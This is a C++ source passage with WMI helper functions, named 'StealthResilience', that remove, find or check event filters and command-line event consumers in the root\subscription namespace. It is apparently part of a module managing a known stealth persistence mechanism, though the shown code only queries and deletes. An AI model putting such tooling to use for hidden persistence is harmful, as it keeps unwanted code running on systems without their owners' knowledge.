        return FALSE;
    }

    ComPtr<IWbemServices> services;
    if (FAILED(ConnectWmi(NormalizeNamespace(L"root\\subscription"), services))) {
        return FALSE;
    }

    DWORD filterRemoved = 0;
    DWORD consumerRemoved = 0;

    if (!IsNullOrEmpty(filterPrefix)) {
        std::wstring query = L"SELECT * FROM __EventFilter WHERE Name LIKE '";
        query.append(filterPrefix);
        query.append(L"%'");
        ScopedBstr queryBstr(query.c_str());
        ScopedBstr lang(L"WQL");

        ComPtr<IEnumWbemClassObject> enumerator;
        if (SUCCEEDED(services->ExecQuery(lang.Get(), queryBstr.Get(), WBEM_FLAG_FORWARD_ONLY, nullptr, &enumerator)) && enumerator) {
            ULONG fetched = 0;
            ComPtr<IWbemClassObject> obj;
            while (enumerator->Next(WBEM_INFINITE, 1, &obj, &fetched) == S_OK && fetched == 1) {
                ScopedVariant nameVar;
                if (SUCCEEDED(obj->Get(L"Name", 0, &nameVar.get(), nullptr, nullptr)) && nameVar.get().vt == VT_BSTR) {
                    std::wstring filterPath = L"__EventFilter.Name=\"" + EscapeWmiName(nameVar.get().bstrVal) + L"\"";
                    if (SUCCEEDED(DeleteWmiInstance(services.Get(), filterPath))) {
                        ++filterRemoved;
                    }
                }
                obj.Reset();
            }
        }
    }

    if (!IsNullOrEmpty(consumerPrefix)) {
        std::wstring query = L"SELECT * FROM CommandLineEventConsumer WHERE Name LIKE '";
        query.append(consumerPrefix);
        query.append(L"%'");
        ScopedBstr queryBstr(query.c_str());
        ScopedBstr lang(L"WQL");

        ComPtr<IEnumWbemClassObject> enumerator;
        if (SUCCEEDED(services->ExecQuery(lang.Get(), queryBstr.Get(), WBEM_FLAG_FORWARD_ONLY, nullptr, &enumerator)) && enumerator) {
            ULONG fetched = 0;
            ComPtr<IWbemClassObject> obj;
            while (enumerator->Next(WBEM_INFINITE, 1, &obj, &fetched) == S_OK && fetched == 1) {
                ScopedVariant nameVar;
                if (SUCCEEDED(obj->Get(L"Name", 0, &nameVar.get(), nullptr, nullptr)) && nameVar.get().vt == VT_BSTR) {
                    std::wstring consumerPath = L"CommandLineEventConsumer.Name=\"" + EscapeWmiName(nameVar.get().bstrVal) + L"\"";
                    if (SUCCEEDED(DeleteWmiInstance(services.Get(), consumerPath))) {
                        ++consumerRemoved;
                    }
                }
                obj.Reset();
            }
        }
    }

    if (removedFilters) {
        *removedFilters = filterRemoved;
    }
    if (removedConsumers) {
        *removedConsumers = consumerRemoved;
    }
    return TRUE;
}

BOOL StealthResilience_FindWmiSubscriptionsByPrefix(
    const wchar_t* filterPrefix,
    const wchar_t* consumerPrefix,
    wchar_t* outFilterName,
    size_t filterNameCch,
    wchar_t* outConsumerName,
    size_t consumerNameCch)
{
    if (outFilterName != nullptr && filterNameCch > 0) {
        outFilterName[0] = L'\0';
    }
    if (outConsumerName != nullptr && consumerNameCch > 0) {
        outConsumerName[0] = L'\0';
    }

    if (IsNullOrEmpty(filterPrefix) && IsNullOrEmpty(consumerPrefix)) {
        return FALSE;
    }

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    ComPtr<IWbemServices> services;
    if (FAILED(ConnectWmi(NormalizeNamespace(L"root\\subscription"), services))) {
        return FALSE;
    }

    auto QueryFirst = [&](const wchar_t* className,
                          const wchar_t* prefix,
                          wchar_t* destination,
                          size_t destinationCch) -> bool
    {
        if (IsNullOrEmpty(prefix) || destination == nullptr || destinationCch == 0) {
            return false;
        }

        std::wstring query = L"SELECT Name FROM ";
        query.append(className);
        query.append(L" WHERE Name LIKE '");
        query.append(prefix);
        query.append(L"%'" );

        ScopedBstr queryBstr(query.c_str());
        ScopedBstr lang(L"WQL");
        ComPtr<IEnumWbemClassObject> enumerator;
        if (FAILED(services->ExecQuery(lang.Get(), queryBstr.Get(),
                WBEM_FLAG_FORWARD_ONLY, nullptr, &enumerator)) || !enumerator) {
            return false;
        }

        ULONG fetched = 0;
        ComPtr<IWbemClassObject> obj;
        if (enumerator->Next(WBEM_INFINITE, 1, &obj, &fetched) == S_OK && fetched == 1) {
            ScopedVariant nameVar;
            if (SUCCEEDED(obj->Get(L"Name", 0, &nameVar.get(), nullptr, nullptr)) &&
                nameVar.get().vt == VT_BSTR) {
                wcsncpy_s(destination, destinationCch, nameVar.get().bstrVal, _TRUNCATE);
                return true;
            }
        }
        return false;
    };

    BOOL found = FALSE;
    if (!IsNullOrEmpty(filterPrefix) && outFilterName != nullptr && filterNameCch > 0) {
        if (QueryFirst(L"__EventFilter", filterPrefix, outFilterName, filterNameCch)) {
            found = TRUE;
        }
    }
    if (!IsNullOrEmpty(consumerPrefix) && outConsumerName != nullptr && consumerNameCch > 0) {
        if (QueryFirst(L"CommandLineEventConsumer", consumerPrefix, outConsumerName, consumerNameCch)) {
            found = TRUE;
        }
    }

    return found ? TRUE : FALSE;
}

BOOL StealthResilience_WmiSubscriptionExists(
    const wchar_t* filterName,
    const wchar_t* consumerName)
{
    if (IsNullOrEmpty(filterName) && IsNullOrEmpty(consumerName)) {
        return FALSE;
    }

    ComInitGuard guard;
    if (FAILED(guard.status()) || FAILED(EnsureComSecurity())) {
        return FALSE;
    }

    ComPtr<IWbemServices> services;
    if (FAILED(ConnectWmi(NormalizeNamespace(L"root\\subscription"), services))) {
        return FALSE;
    }

    auto Exists = [&](const wchar_t* className, const wchar_t* name) -> bool
    {
        if (IsNullOrEmpty(name)) {
            return true;
        }
        std::wstring path = std::wstring(className) + L".Name=\"" + EscapeWmiName(name) + L"\"";
        ScopedBstr pathBstr(path.c_str());
        if (pathBstr.Get() == nullptr) {
            return false;
        }
        ComPtr<IWbemClassObject> object;
        HRESULT hr = services->GetObject(pathBstr.Get(), 0, nullptr, &object, nullptr);
        return SUCCEEDED(hr) && object != nullptr;
    };

    if (!Exists(L"__EventFilter", filterName)) {
        return FALSE;
    }
    if (!Exists(L"CommandLineEventConsumer", consumerName)) {
        return FALSE;
    }
    return TRUE;
}
